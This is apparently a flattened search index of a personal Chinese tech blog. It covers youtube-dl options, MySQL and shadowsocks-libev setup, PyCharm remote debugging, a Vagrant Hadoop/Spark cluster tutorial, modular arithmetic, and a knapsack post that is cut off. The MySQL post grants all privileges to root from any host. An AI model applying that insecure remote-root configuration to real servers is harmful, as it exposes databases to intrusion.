                      a value between 0 (better) and 9 (worse)                                 for VBR or a specific bitrate like 128K                                 (default 5)--recode-video FORMAT            Encode the video to another format if                                 necessary (currently supported:                                 mp4|flv|ogg|webm|mkv|avi)--postprocessor-args ARGS        Give these arguments to the postprocessor-k, --keep-video                 Keep the video file on disk after the post-                                 processing; the video is erased by default--no-post-overwrites             Do not overwrite post-processed files; the                                 post-processed files are overwritten by                                 default--embed-subs                     Embed subtitles in the video (only for mp4,                                 webm and mkv videos)--embed-thumbnail                Embed thumbnail in the audio as cover art--add-metadata                   Write metadata to the video file--metadata-from-title FORMAT     Parse additional metadata like song title /                                 artist from the video title. The format                                 syntax is the same as --output. Regular                                 expression with named capture groups may                                 also be used. The parsed parameters replace                                 existing values. Example: --metadata-from-                                 title &quot;%(artist)s - %(title)s&quot; matches a                                 title like &quot;Coldplay - Paradise&quot;. Example                                 (regex): --metadata-from-title                                 &quot;(?P&lt;artist&gt;.+?) - (?P&lt;title&gt;.+)&quot;--xattrs                         Write metadata to the video file&#x27;s xattrs                                 (using dublin core and xdg standards)--fixup POLICY                   Automatically correct known faults of the                                 file. One of never (do nothing), warn (only                                 emit a warning), detect_or_warn (the                                 default; fix file if we can, warn                                 otherwise)--prefer-avconv                  Prefer avconv over ffmpeg for running the                                 postprocessors--prefer-ffmpeg                  Prefer ffmpeg over avconv for running the                                 postprocessors (default)--ffmpeg-location PATH           Location of the ffmpeg/avconv binary;                                 either the path to the binary or its                                 containing directory.--exec CMD                       Execute a command on the file after                                 downloading, similar to find&#x27;s -exec                                 syntax. Example: --exec &#x27;adb push &#123;&#125;                                 /sdcard/Music/ &amp;&amp; rm &#123;&#125;&#x27;--convert-subs FORMAT            Convert the subtitles to other format                                 (currently supported: srt|ass|vtt|lrc)\n"},{"title":"乌班图MySQL安装","url":"/2018/03/25/%E4%B9%8C%E7%8F%AD%E5%9B%BEMySQL%E5%AE%89%E8%A3%85/","content":"\nMySQL安装\n首先在命令行中输入三个命令：\nsudo apt-get install mysql-serversudo apt install mysql-clientsudo apt install libmysqlclient-dev\n接下来确认系统是否已经安装上Mysql:\n输入命令：mysql --help 出现如下一大串help，即为成功： \n可以通过如下命令进入MySQL服务： mysql -uroot -p\n会让你输入密码，在安装的时候有时候会出现让你设置密码，有些是默认登录。\n\n现在设置mysql允许远程访问，首先编辑文件\n/etc/mysql/mysql.conf.d/mysqld.cnf：\nsudo nano /etc/mysql/mysql.conf.d/mysqld.cnf\n注释掉bind-address = 127.0.0.1：\nsudo nano /etc/mysql/mysql.conf.d/mysqld.cnf \n保存退出，然后进入mysql服务，执行授权命令：\nGrant all on *.* to &#x27;root&#x27;@&#x27;%&#x27; identified by &#x27;root用户的密码&#x27; with grant option;flush privileges;\n然后执行quit命令退出mysql服务，执行如下命令重启mysql：\nservice mysql restart\n补充：在进入MySQL时，输入mysql -uroot -p命令时，会出现\n&gt; ERROR 1045 (28000): Access denied for user\n‘root’@’localhost’这种情况。于是在网上查了许多技术网站，发现一篇不错的，据此解决。链接：\nhttps://blog.csdn.net/learner_lps/article/details/62887343\n"},{"title":"使用shadowsocks-libev代替shadowsocks-python，并开启ipv6支持","url":"/2018/07/12/%E4%BD%BF%E7%94%A8shadowsocks-libev%E4%BB%A3%E6%9B%BFshadowsocks-python%EF%BC%8C%E5%B9%B6%E5%BC%80%E5%90%AFipv6%E6%94%AF%E6%8C%81/","content":"\nubuntu安装shadowsocks-libev\n本有一篇博文写的是使用docker快速部署shadowsocks，但是存在以下问题：\n\ndocker部署上是基于python2.7下的shadowsocks包，效率不高；\npython（包括2/3）下的shadowsocks包上次更新已经是2015年8月，距今时间过久，存在版本迭代上的一些bug。\n\n这次的安装使用shadowsocks-libev，其使用C写的ss服务端，附上github项目地址：\nhttps://github.com/shadowsocks/shadowsocks-libev\nsudo apt-get updatesudo apt-get install shadowsocks-libev\n相关文件位置说明\n启动文件：/etc/init.d/shadowsocks-libev 配置文件：\n/etc/shadowsocks-libev/config.json 一些默认启动配置：\n/etc/default/shadowsocks-libev\n编辑shadowsocks参数\n修改配置文件：\nsudo nano /etc/shadowsocks-libev/config.json\n修改样例：\n&#123;    &quot;server&quot;:[&quot;[::0]&quot;, &quot;0.0.0.0&quot;],    &quot;server_port&quot;:8388,    &quot;local_port&quot;:1080,    &quot;password&quot;:&quot;PASSWORD&quot;,    &quot;timeout&quot;:60,    &quot;method&quot;:&quot;aes-256-cfb&quot;&#125;\n\"server\"中：使用[\"[::0]\", \"0.0.0.0\"]分别监听ipv6、ipv4所有请求\n\"password\"中：修改为所想设置的密码\n\n注意：以前在shadowsock-python有使用\"server\":\"::\"会默认监听ipv4、ipv6，但是该设置在shadowsocks-libev不生效，仅仅监听ipv6\n\n控制shadowsocks\nsudo service shadowsocks-libev start    # 重启shadowsockssudo service shadowsocks-libev stop     # 关闭shadowsockssudo service shadowsocks-libev restart  # 参数改变后重启生效\n查看是否启动，返回结果样例\nps aux |grep ss-servernobody   16623  0.0  0.9  32088  4672 ?        Ss   12:05   0:00 /usr/bin/ss-server -c /etc/shadowsocks-libev/config.json -uroot     16825  0.0  0.2  14856  1068 pts/1    S+   13:12   0:00 grep --color=auto ss-server\n注意：使用shadowsocks的ipv6必须保证双栈（服务器和客户端均启用ipv6）支持。附一个ipv6检测网址\n本来听说校园网是支持ipv6的，还有可能不限流量，但是……\n\n"},{"title":"使用PyCharm进行远程开发和Django调试","url":"/2018/08/08/%E4%BD%BF%E7%94%A8PyCharm%E8%BF%9B%E8%A1%8C%E8%BF%9C%E7%A8%8B%E5%BC%80%E5%8F%91%E5%92%8CDjango%E8%B0%83%E8%AF%95/","content":"存在这样一种情况，经常在非服务器环境下开发python程序，即使在本地运行良好，但是在服务器的环境下就会存在问题，如何保证开发环境跟运行环境一致呢？\n这里通过PyCharm的远程解释器加上自动文件同步功能，实现\n\n本地编译 -&gt; 同步到服务器 -&gt; 远程debug\n\n的方式来调试程序。\n远程服务器的同步配置\n局域网下的服务器IP地址为: 192.168.2.192，python版本3.6,\n且在项目下已有虚拟环境，开启ssh服务。\n首先我们需要配置PyCharm通服务器的代码同步，打开Tools | Deployment |\nConfiguration\n点击左边的“+”添加一个部署配置，输入名字，类型选SFTP\n\n确定之后，再配置远程服务器的ip、端口、用户名和密码。root\npath是文件上传的根目录，注意这个目录必须用户名有权限创建文件。\n\n然后配置映射，local\npath是你的工程目录，就是需要将本地这个目录同步到服务器上面，我填的是项目根目录。\nDeploy path on server 这里填写相对于root path的目录，下面那个web\npath不用管先\n\n还有一个设置，打开Tools | Deployment | Options，将”Create Empty\ndirectories”打上勾，要是指定的文件夹不存在，会自动创建。\n上传和下载文件\n有几种方法可以实现本地和远程文件的同步，手动和当文件保存后自动触发。这里我选中Automatic upload。\n手动上传方式很简单，选择需要同步的文件或文件夹，然后选择 Tools |\nDeployment | Upload to sftp(这个是刚刚配置的部署名称)\n如果在服务器存在已有项目，选择Compare with …\n，然后全部接受服务器端的文件。\n\n比较远程和本地文件\n有时候你并不确定远程和本地版本的完全一致，需要去比较看看。PyCharm提供了对比视图来为你解决这个问题。\n选择Tools | Deployment | Browse Remote\nHost，打开远程文件视图，在右侧窗口就能看到远程主机中的文件\n\n选择一个你想要对比的文件夹，点击右键-&gt;Sync with\nLocal，打开同步对比窗口，使用左右箭头来同步内容。\n配置远程Python解释器\n新建一个python解释器，选择SSH 解释器，由于我上面配置过就直接选模板，\n这里请仔细看我的Python解释器是虚拟环境virtualenv，这个要在服务器上面先创建好虚拟环境。\n\n配置Django运行参数\n指定启动Host为0.0.0.0，表示允许所有ip进行调试\n若需要启动web浏览器，指定下地址为服务器端的ip\n\n"},{"title":"信息162大三上必修课期末考试时间安排","url":"/2018/11/20/%E4%BF%A1%E6%81%AF162%E5%A4%A7%E4%B8%89%E4%B8%8A%E5%BF%85%E4%BF%AE%E8%AF%BE%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95%E6%97%B6%E9%97%B4%E5%AE%89%E6%8E%92/","content":"\n第十九周\n\n\n\n\n课程\n日期\n时间\n\n\n\n\n微机原理\n1月8号\n13:30 - 15:10\n\n\n计算机网络技术\n1月9号\n13:30 - 15:10\n\n\n数字信号处理\n1月10号\n8:00 - 9:40\n\n\n毛概\n1月10号\n10:20 - 12:00\n\n\n通信原理\n1月11号\n15:50 - 17:30\n\n\n\n"},{"title":"使用vagrant搭建hadoop+spark环境","url":"/2020/02/23/%E4%BD%BF%E7%94%A8vagrant%E6%90%AD%E5%BB%BAhadoop+spark%E7%8E%AF%E5%A2%83/","content":"1. 环境准备\n\n下载vagrant和virtualbox，并安装\n\n\nvagrant:https://www.vagrantup.com/\nvirtualbox:https://www.virtualbox.org/\n注意：vagrant2.2.7发布，本次更新主要添加了对virtualbox6.1.x版本的支持。\n\n\n虚拟机配置\n\n\n1台master：内存1024MB\n2台slave：内存512MB\n\n2. 使用vagrant部署虚拟机\n\n安装后vagrant，需提前安装vagrant-hostmanager插件，以便host管理\nvagrant plugin install vagrant-hostmanager\n从vagrant官网下载ubuntu 16镜像：\nvagrant box add ubuntu/xenial64\n也可以使用其他镜像，镜像地址：https://app.vagrantup.com/boxes/search\n创建hadoopProject文件夹（可自定），并创建两个文件Vagrantfile和init.sh\n\n\nVagrantFile是vagrant的启动配置文件，\ninit.sh是初始环境的安装脚本\n\n编辑VagrantFile文件， 内容如下:\n\nVagrant.configure(&quot;2&quot;) do |config|   config.vm.define :master1, primary: true do |master|      master.vm.provider &quot;virtualbox&quot; do |v|         v.customize [&quot;modifyvm&quot;, :id, &quot;--name&quot;, &quot;hadoop-master1&quot;, &quot;--memory&quot;, &quot;1024&quot;]      end      master.vm.box = &quot;ubuntu/xenial64&quot;      master.vm.hostname = &quot;hadoop-master1&quot;      master.vm.network :private_network, ip: &quot;192.168.10.10&quot;      master.vm.network &quot;forwarded_port&quot;, guest: 22, host: 2222, id: &quot;ssh&quot;, disabled: &quot;true&quot;      master.vm.network &quot;forwarded_port&quot;, guest: 22, host: 2220   end   (1..2).each do |i|      config.vm.define &quot;slave#&#123;i&#125;&quot; do |node|         node.vm.box = &quot;ubuntu/xenial64&quot;         node.vm.hostname = &quot;hadoop-slave#&#123;i&#125;&quot;         node.vm.network :private_network, ip: &quot;192.168.10.1#&#123;i&#125;&quot;         node.vm.network &quot;forwarded_port&quot;, guest: 22, host: 2222, id: &quot;ssh&quot;, disabled: &quot;true&quot;         node.vm.network &quot;forwarded_port&quot;, guest: 22, host: &quot;222#&#123;i&#125;&quot;         node.vm.provider &quot;virtualbox&quot; do |vb|            vb.memory = &quot;512&quot;         end      end   end   #manage hosts file    config.hostmanager.enabled = true   config.hostmanager.manage_host = true   config.hostmanager.manage_guest = true   #provision   config.vm.provision &quot;shell&quot;, path: &quot;init.sh&quot;, privileged: falseend\n从代码可以看到， 我们一共创建了3个虚拟机环境 ，分别是master1, slave1,\nslave2。并分配好IP地址和内存空间。\n注意：在解决多个SSH端口时，需要先禁用默认的ssh转发，再添加自定义转发，才能生效。\n\n在当前目录启动vagrant，会自动依照Vagrantfile配置文件创建虚拟机并配置。\nvagrant up\n\n启动过程中如果有打印如下信息，\n一般稍等即可，出错可在VirtulaBox中删除虚拟机及文件重试。\n\n正常启动后，我们就可以在virtualBox中看到创建的虚拟机。\n\n正常启动后，我们就可以使用以下命令登录到虚拟机：\nvagrant ssh master1\n可以直接按照host名字Ping操作：\n\n注意：此时默认用户名和密码都是vagrant\n此时，主机仅允许公钥私钥配对SSH链接，建议打开密码认证访问，编辑文件/etc/ssh/sshd_config，修改如下配置为yes：\nPasswordAuthentication yes\n重启ssh服务\nsudo service ssh restart\n\n编写provision文件\n前面安装vagrant的时候说到，provision的作用是帮助我们进行主机环境的初始化工作，现在我们来编写init.sh，具体内容根据实际情况进行删减。在provision里，我只是安装了linux环境必需的一些组件。\n\nsudo apt update         # 更新aptsudo apt install openssh-server  # 安装SSHsudo apt install openjdk-8-jdk     # 安装JAVA\n\n即使因为网络问题导致安装不成功，也可以手动逐个安装。\n\n编写完后，运行命令进行生效\nvagrant provision\n\n3. 配置Hadoop\n现在我们有三台机器:\nhadoop-master1  192.168.10.10hadoop-slave1  192.168.10.11hadoop-slave2  192.168.10.12\nHadoop 集群配置过程:\n\n选定一台机器作为\nMaster，在所有主机上配置网络映射；\n在 Master 主机上配置hadoop用户、安装SSH\nserver、安装Java环境；\n在 Master 主机上安装Hadoop，并完成配置；\n在其他主机上配置hadoop用户、安装SSH\nserver、安装Java环境；\n将 Master 主机上的Hadoop目录复制到其他主机上；\n开启、使用 Hadoop。\n\n\n配置基础环境和SSH互信\n所有主机配置hadoop用户、安装SSH\nserver、安装Java环境（前步已执行成功的可以跳过）：\nsudo useradd -m hadoop -s /bin/bash     # 创建hadoop用户sudo passwd hadoop          # 修改hadoop用户密码sudo adduser hadoop sudo    # 增加hadoop管理员权限\n注销并使用 Hadoop 用户登录\nsudo apt update         # 更新aptsudo apt install openssh-server  # 安装SSHsudo apt install openjdk-8-jdk     # 安装JAVA\n设置JAVA_HOME环境变量\nsudo nano ~/.bashrc# 最后面加上export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64\n使 JAVA_HOME 变量生效：\nsource ~/.bashrc    # 使变量设置生效\n在 Master 主机上执行：\ncd ~/mkdir .sshcd ~/.sshssh-keygen -t rsa              # 一直按回车就可以cat id_rsa.pub &gt;&gt; authorized_keysscp ~/.ssh/id_rsa.pub hadoop@hadoop-slave1:/home/hadoop/ # 传输公钥到slave1scp ~/.ssh/id_rsa.pub hadoop@hadoop-slave2:/home/hadoop/ # 传输公钥到slave2\n接着在 slave1 节点和slave2节点上保存公钥\ncd ~/mkdir .sshcat ~/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys\n如果master主机和slave01、slave02主机的用户名一样，那么在master主机上直接执行如下测试命令，即可让master主机免密码登录slave01、slave02主机。\nssh hadoop-slave1\n安装Hadoop\n先在master主机上做安装Hadoop，暂时不需要在slave1，slave2主机上安装Hadoop。稍后会把master配置好的Hadoop发送给slave1，slave2。\n在master主机执行如下操作：\ntar -zxf ~/hadoop-2.7.7.tar.gz -C /usr/local    # 解压到/usr/local中cd /usr/local/sudo mv ./hadoop-2.7.7/ ./hadoop            # 将文件夹名改为hadoopsudo chown -R hadoop ./hadoop       # 修改文件权限\n编辑~/.bashrc文件，末尾添加如下内容：\nexport HADOOP_HOME=/usr/local/hadoopexport PATH=$PATH:$HADOOP_HOME/bin:$HADOOP_HOME/sbin\n接着让环境变量生效，执行如下代码：\nsource ~/.bashrc\nHadoop集群配置\n修改master主机修改Hadoop如下配置文件，这些配置文件都位于/usr/local/hadoop/etc/hadoop目录下。\n修改slaves文件，把DataNode的主机名写入该文件，每行一个。\n这里让hadoop-master1节点主机仅作为NameNode使用（不包含在slaves文件中）。\nhadoop-slave1hadoop-slave2\n修改core-site.xml\n&lt;configuration&gt;   &lt;property&gt;      &lt;name&gt;hadoop.tmp.dir&lt;/name&gt;      &lt;value&gt;/usr/local/hadoop/tmp&lt;/value&gt;      &lt;description&gt;Abase for other temporary directories.&lt;/description&gt;   &lt;/property&gt;   &lt;property&gt;      &lt;name&gt;fs.defaultFS&lt;/name&gt;      &lt;value&gt;hdfs://hadoop-master1:9000&lt;/value&gt;   &lt;/property&gt;&lt;/configuration&gt;\n修改hdfs-site.xml：\n&lt;configuration&gt;   &lt;property&gt;      &lt;name&gt;dfs.replication&lt;/name&gt;      &lt;value&gt;3&lt;/value&gt;   &lt;/property&gt;&lt;/configuration&gt;\n修改mapred-site.xml（复制并修改文件名mapred-site.xml.template）\ncp mapred-site.xml.template  mapred-site.xml\n&lt;configuration&gt;   &lt;property&gt;      &lt;name&gt;mapreduce.framework.name&lt;/name&gt;      &lt;value&gt;yarn&lt;/value&gt;   &lt;/property&gt;&lt;/configuration&gt;\n修改yarn-site.xml\n&lt;configuration&gt;   &lt;!-- Site specific YARN configuration properties --&gt;   &lt;property&gt;      &lt;name&gt;yarn.nodemanager.aux-services&lt;/name&gt;      &lt;value&gt;mapreduce_shuffle&lt;/value&gt;   &lt;/property&gt;   &lt;property&gt;      &lt;name&gt;yarn.resourcemanager.hostname&lt;/name&gt;      &lt;value&gt;hadoop-master1&lt;/value&gt;   &lt;/property&gt;&lt;/configuration&gt;\n配置好后，将 master 上的 /usr/local/Hadoop\n文件夹复制到各个节点上。之前有跑过伪分布式模式，建议在切换到集群模式前先删除之前的临时文件。在\nmaster 节点主机上执行：\ncd /usr/local/rm -rf /usr/local/hadoop/tmp   # 删除临时文件rm -rf /usr/local/hadoop/logs/*   # 删除日志文件tar -zcf ~/hadoop.master.tar.gz ./hadoop   # 打包hadoopcd ~scp ./hadoop.master.tar.gz hadoop-slave1:/home/hadoopscp ./hadoop.master.tar.gz hadoop-slave2:/home/hadoop\n在hadoop-slave1，hadoop-slave2节点上执行：\nsudo rm -rf /usr/local/hadoop/sudo tar -zxf ~/hadoop.master.tar.gz -C /usr/localsudo chown -R hadoop /usr/local/hadoop\n启动hadoop集群\n在hadoop-master1主机上执行如下命令：\n/usr/local/hadoop/bin/hdfs namenode -format/usr/local/hadoop/sbin/start-all.sh\n运行后，在hadoop-master1，hadoop-slave1，hadoop-slave2运行jps命令，查看：\nhadoop-master1运行jps后，如下图（必须有四个进程）：\n\nhadoop-slave1、hadoop-slave2运行jps后，如下图（必须有三个进程）：\n\n4. 在Hadoop上配置Spark\n下载Spark\n访问Spark官方下载地址，按照如下图下载（不带Hadoop版本）。\n\n下载后，文件移到master虚拟机中，执行解压\ncd ~sudo tar -zxf spark-2.4.5-bin-without-hadoop.tgz -C /usr/local/cd /usr/local/sudo mv ./spark-2.4.5-bin-without-hadoop/ ./sparksudo chown -R hadoop ./spark\n配置环境变量\n在hadoop-master1节点主机的终端中执行如下命令：\nsudo nano ~/.bashrc\n在~/.bashrc添加如下配置：\nexport SPARK_HOME=/usr/local/sparkexport PATH=$PATH:$SPARK_HOME/bin:$SPARK_HOME/sbin\n执行如下命令使得配置立即生效：\nsource ~/.bashrc\nSpark配置\n在Master节点主机上进行如下操作：\n\n配置slaves文件\n\ncd /usr/local/spark/cp ./conf/slaves.template  ./conf/slaves\nslaves文件设置Worker节点。编辑slaves内容，把默认内容localhost替换成slave节点：\nhadoop-slave1hadoop-slave2\n\n配置spark-env.sh文件\n\ncp ./conf/spark-env.sh.template ./conf/spark-env.sh\n添加如下内容：\nexport SPARK_DIST_CLASSPATH=$(/usr/local/hadoop/bin/hadoop classpath)export HADOOP_CONF_DIR=/usr/local/hadoop/etc/hadoopexport SPARK_MASTER_IP=hadoop-master1\nSPARK_MASTER_IP 指定 Spark 集群 Master 节点的 IP 地址或主机名。\n配置好后，将Master主机上的/usr/local/spark文件夹复制到各个节点上。在Master主机上执行如下命令：\ncd /usr/local/tar -zcf ~/spark.master.tar.gz ./spark     # 打包sparkcd ~scp ./spark.master.tar.gz hadoop-slave1:/home/hadoopscp ./spark.master.tar.gz hadoop-slave2:/home/hadoop\n在hadoop-slave1，hadoop-slave2节点上执行：\nsudo rm -rf /usr/local/spark/sudo tar -zxf ~/spark.master.tar.gz -C /usr/localsudo chown -R hadoop /usr/local/spark\n注意：由于我们使用vagrant-hostmanager插件，其会对本地hosts文件修改，导致主机名（host）直接与127.0.1.1绑定，若直接启动Spark\nmaster节点，会导致只在127.0.1.1提供服务，其他局域网内slave节点无法访问，因此需要编辑/etc/hosts文件，注释掉：\n#127.0.1.1      hadoop-master1  hadoop-master1\n启动Spark集群\n\n启动Spark集群前，要先启动Hadoop集群。在Master节点主机上运行如下命令：\n\n/usr/local/hadoop/sbin/start-all.sh\n\n启动Master节点，\n在Master节点主机上运行如下命令：\n\n/usr/local/spark/sbin/start-master.sh\n在hadoop-master1节点上运行jps命令，可以看到多了Master进程：\n\n\n启动所有Slave节点，在Master节点主机上运行如下命令：\n\n/usr/local/spark/sbin/start-slaves.sh\n分别在hadoop-slave1、hadoop-slave2节点上运行jps命令，可以看到多了Worker进程：\n\n在浏览器上查看Spark独立集群管理器的集群信息\nspark集群端口：8080\nspark-job监控端口：4040\nnamenode管理端口：50070\nyarn端口：8088\n在master主机上打开浏览器，访问http://hadoop-master1:8080/，如下图：\n\n关闭Spark集群\n\n关闭Master节点\n/usr/local/spark/sbin/stop-master.sh\n关闭Worker节点\n/usr/local/spark/sbin/stop-slaves.sh\n关闭Hadoop集群\n/usr/local/hadoop/sbin/stop-all.sh\n\n"},{"title":"加减乘除的取模运算","url":"/2024/07/09/%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E7%9A%84%E5%8F%96%E6%A8%A1%E8%BF%90%E7%AE%97/","content":"某些题目，由于要计算的答案非常大（超出64位整数的范围），会要求把答案对\n109 + 7取模。如果在计算中途没有处理得当的话，会出现WA（错误）或则TLE（超时）。\n例如计算多项乘积时，如果没有中途及时取模，乘法结果会溢出（例如C/C++），从而得到非预期的答案\n。对于 Python 来说，虽然没有溢出，但是大整数（big\ninteger）之间的运算不是 O(1)，可能会导致LTE。\n加法和乘法的取模\n一般涉及到取模（$\\bmod$）的题目，会用到如下两个恒等式 $$\n\\begin{align}\n(a+b) \\bmod m &amp;= ((a \\bmod m) + (b \\bmod m)) \\bmod m \\\\\n(a \\cdot b) \\bmod m &amp;= ((a \\bmod m) \\cdot (b \\bmod m)) \\bmod m \\\\\n\\end{align}\n$$\n证明：根据带余除法，∀a ∈ 𝕫，都可以表示为a = qm + r (m ≠ 0)，其中整数q为a除以m的商（quotient），整数r为a除以m的余数（remainder），即r = a mod  m。\n设a = q1m + r1，b = q2m + r2。\n第一个恒等式： $$\n\\begin{align}\n(a+b) \\bmod m &amp;= (q_1 m + r_1 +q_2 m + r_2) \\bmod m \\\\\n&amp;=((q_1 + q_2)m + r_1 + r_2) \\bmod m \\\\\n&amp;=(r_1 + r_2) \\bmod m\n\\end{align}\n$$ 又因为r1 = a mod  m，r2 = b mod  m有：\n(a + b) mod  m = ((a mod  m) + (b mod  m)) mod  m\n第二个恒等式： $$\n\\begin{align}\n(a\\cdot b) \\bmod m &amp;= ((q_1 m + r_1)(q_2 m + r_2)) \\bmod m \\\\\n&amp;= (q_1 q_2 m^2 + (q_1 r_2 + q_2 r_1)m + r_1 r_2) \\bmod m \\\\\n&amp;=(r_1 r_2) \\bmod m\n\\end{align}\n$$\n同样有： (a ⋅ b) mod  m = ((a mod  m) ⋅ (a mod  m)) mod  m\n根据这两个恒等式，我们可以在计算过程中（例如循环中），对加法和乘法的结果取模，而不是在计算最终结果后再取模。\n注意：如果涉及到幂运算，不能随意取模。如果指数为整数，可以用快速幂。\n如果计算过程中有减法，可能会产生负数，处理不当也会导致\nWA。如何正确处理这种情况呢？\n同余\n首先引入同余（congruence modulo） 的概念。 两个整数a，b，若它们除以正整数m所得的余数相等，则称a，b对于模m同余，记作： a ≡ b (mod  m)\n例如42 ≡ 12 (mod  10)，因为42和12都可以被10整除，余数都是2。\n负数的取模\n对于负数，我们可以将其转化为对应的非负数再取模。例如，−17 mod  10可以转化为((−17 mod  10) + 10) mod  10 = (−7 + 10) mod  10，结果是3。 也就是说，如果我们发现 (x mod  m) &lt; 0，可以加上一个m，得到非负数。\n为避免判断x mod  m &lt; 0，可以写成\n(x mod  m + m) mod  m\n这样无论x是否为负数，运算结果都会落在区间[0, m − 1]中。\n除法的取模\n如果要计算$\\frac{24}{8} \\bmod\n5$，如果像加法或乘法处理，写成$\\frac{24\n\\bmod 5}{8 \\bmod 5} \\bmod 5 = \\frac{4}{3}$，明显不是正确答案3。先有结论：\n如果p是一个质数，a是b的倍数且b和p互质，那么有 $$\n\\frac{a}{b} \\bmod p = (a \\cdot b^{p-2}) \\bmod p\n$$\n如果实际题目中推导出了包含除法的求余式，可以用上式转换成乘法，并用快速幂计算bp − 2 mod  p。\n证明：\n\n引理1： 当p是质数且1 ≤ i ≤ p − 1时，有 Cpi ≡ 0 (mod  p)\n\n其中 $$\n\\mathrm{C}_p^i = \\frac{p!}{i!(p-i)!}\n$$ 证明：当p是质数且1 ≤ i ≤ p − 1时，$\\frac{p!}{i!(p-i)!}$分母一定不含p，由于分子中包含p且Cpi为整数，所以Cpi一定能被p整除，即Cpi ≡ 0 (mod  p)。\n\n引理2： 根据二项式定理，有\n$$\n(x+y)^p = \\sum_{k=0}^{p}{\\mathrm{C}_p^k x^{p-k} y^k} =\n\\sum_{k=0}^{p}{\\mathrm{C}_p^k x^k y^{p-k}}\n$$\n\n当p为质数，且x, y ∈ 𝕫时，除去k = 0和k = p两项，根据引理1，其余项与0关于p同余。即 $$\n\\sum_{k=1}^{p-1}{\\mathrm{C}_p^k x^{p-k} y^k} \\equiv 0 \\pmod p\n$$ 拆分 $$\n\\begin{align}\n(x+y)^p &amp;= \\mathrm{C}_p^0 x^p y^0 + \\sum_{k=1}^{p-1}{\\mathrm{C}_p^k\nx^{n-k} y^k} + \\mathrm{C}_p^p x^0 y^p \\\\\n&amp;=x^p + y^p + \\sum_{k=1}^{p-1}{\\mathrm{C}_p^k x^{n-k} y^k}\n\\end{align}\n$$\n于是当p为质数，且x, y ∈ 𝕫时，有： (x + y)p ≡ xp + yp (mod  p)\n根据费马小定律，对任意整数a和任意质数p，有： ap ≡ a (mod  p)\n证明：当a = 0时，0p ≡ 0 (mod  p)成立；\n已知引理2，通过归纳法，我们可以得到： (x1 + ... + xn)p ≡ x1p + ... + xnp (mod  p)\n如果将a展开为a个1相加，a = 1 + ... + 1,代入上式有： ap ≡ (1 + ... + 1)p ≡ 1p + ... + 1p ≡ a (mod  p)\n根据数学归纳法，原命题对于 a ≥ 0 成立。对于a &lt; 0的情况同理，证明完毕。\n如果a不是p的倍数，费马小定理也可以写成更加常用的一种形式：\nap − 1 ≡ 1 (mod  p)\n如果a是p的倍数，显然有：ap − 1 ≡ 0 (mod  p)。\n在a不是p的倍数的前提下，两边同时乘以$\\frac{b}{a}$，有 $$\nb \\cdot a^{p-2} \\equiv \\frac{b}{a} \\pmod p\n$$\n即 $$\n\\frac{b}{a} \\bmod p = (b \\cdot a^{p-2}) \\bmod p\n$$\n总结\n// 如果取模到 [0, MOD-1] 中，无论正负(a % MOD + MOD) % MOD// 多个数相乘，要步步取模，防止溢出(a * b * c) % MOD = a * b % MOD * c % MOD// 除（MOD 是质数且 b 不是 MOD 的倍数）(a / b) % MOD =  a * qpow(b, MOD-2, MOD) % MOD  // qpow 是快速幂\n"},{"title":"动态规划之背包问题","url":"/2021/04/06/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E4%B9%8B%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/","content":"动态规划之背包问题\n\n背包问题（Knapsack problem）是一种组合优化的NP完全问题。问题可以描述为：给定一组物品，每种物品都有自己的重量和价格，在限定的总重量内，我们如何选择，才能使得物品的总价格最高。问题的名称来源于如何选择最合适的物品放置于给定背包中。\n\n也可以将背包问题描述为决定性问题，即在总重量不超过W的前提下，总价值是否能达到V。\n定义\n我们有n种物品，物品i的重量为wi，价值为vi\n我们假定所有物品的重量和价值都是非负数，背包所能承受的最大重量为W。\n\n如果限定每种物品最多能选择1个，则该背包称为01背包。\n可以用公式表示为：\n\n$$\n\\begin{align}\n最大化 &amp; \\quad \\sum^{n}_{i=1}{v_{i} x_i} \\\\\n受限于 &amp; \\quad \\sum^{n}_{i=1}{w_{i} x_i} \\leq W, \\quad x_i \\in\n\\{0,1\\} \\\\\n\\end{align}\n$$\n\n如果限定物品i最多只能选择bi个，则问题称为多重背包问题（有界背包问题）。\n可以用公式表示为： $$\n\\begin{align}\n最大化 &amp; \\quad \\sum^{n}_{i=1}{v_{j} x_i} \\\\\n受限于 &amp; \\quad \\sum^{n}_{i=1}{w_{i} x_i} \\leq W, \\quad x_i \\in\n\\{0,1…,b_i \\} \\\\\n\\end{align}\n$$\n如果不限定每种物品的数量，则问题称为完全背包问题（无界背包问题）。\n各类复杂的背包问题总可以变换为简单的0-1背包问题进行求解。\n\n01背包\n设一共有N件物品，第i件物品的重量为w[i]，价值为v[i]，最大总重量为W。\n如果采取暴力枚举方法，每件物品都存在装入和不装入两种情况，所以时间复杂度为O(2n)，使用动态规划可以把时间复杂度控制在O(N * W)。求解的总目标是背包物品的总价值，变量有是否放入物品和书包限重。\n定义dp[i][j]表示将前i件物品放入限重为j的书包可以获得的最大价值，其中0 ≤ i ≤ N, 0 ≤ j≤ W。\n状态转移：\n\n不装入第i物品：dp[i][j] = dp[i − 1][j]\n在能装入的前提下，装入第i件物品：dp[i][j] = dp[i − 1][j − w[i]] + v[i]\n\n即状态转移方程为：\ndp[i][j] = max(dp[i-1][j], j-w[i] &gt;= 0 ? dp[i-1][j-w[i]]+v[i] : 0)\n由状态方程可知，dp[i][j]的值只与dp[i-1][0,…,j-1]有关，所以可以采用滚动数组对空间优化。需要注意的是，为了防止上一层循环dp[0,…,j-1]被覆盖，需要逆向枚举j（空间优化前没有这个限制）。代码如下：\nint solution01Knapsack(int N, int W, std::vector&lt;int&gt; &amp;w, std::vector&lt;int&gt; &amp;v) &#123;    // w[i]重量  v[i]价值    std::vector&lt;int&gt; dp(W+1);    for (auto i = 0; i &lt; N; i++) &#123;        for (auto j = W; j &gt;= w[i]; j--) &#123;            dp[j] = std::max(dp[j], dp[j - w[i]] + v[i]);        &#125;    &#125;    return dp[W];&#125;\n时间复杂度为O(NW)，空间复杂度为O(W)。第i件物品装入或者不装入而获得的最大价值完全可以由前面i − 1件物品的最大价值决定，暴力枚举忽略了这个事实。\n完全背包\n设一共有N件物品，第i件物品的重量为w[i]，价值为v[i]，每件可以无限多个，最大总重量为W。\n与01背包非常相似，状态dp定义一致，只是状态转移稍微不同：\n\n不装入第i物品：dp[i][j] = dp[i − 